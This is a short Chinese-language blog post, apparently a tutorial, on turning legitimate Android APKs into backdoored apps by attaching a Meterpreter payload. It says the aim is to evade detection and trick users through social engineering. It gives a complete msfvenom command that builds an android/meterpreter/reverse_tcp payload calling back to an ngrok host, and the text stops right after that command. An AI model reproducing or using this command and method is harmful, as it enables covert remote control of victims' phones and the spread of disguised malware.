---
published: true
layout: post
categories: 技术
---
正常的apk文件当然是可以加上materpreter的payload变成拥有后门的感染文件，在用户安装应用过后就可以对其安卓设备进行控制。但是如果直接用msfvenom来制作这种感染文件，这种文件的散播是存在非常大的问题的，具有原因有以下：
1. 感染文件太常见了，容易被安装系统或者安全系统识别
2. 感染文件名字太奇怪了，不会有正常人去下载安装，在社会工程学上非常难

所以我们就有了将正常软件拿来感染的想法，这种方法能够将payload附着在不同的常见的软件中，以达到欺骗的手段。

当然了这个过程可以是手动或者自动的，自动的软件或者脚本，也可以是手工注入，但是其基本的东西都是msfvenom里面的。
通过
```
msfvenom -p android/meterpreter/reverse_tcp lhost=4.tcp.ngrok.io lport=16715 R > /mnt/d/2022_Oto/payload.apk
```

生成
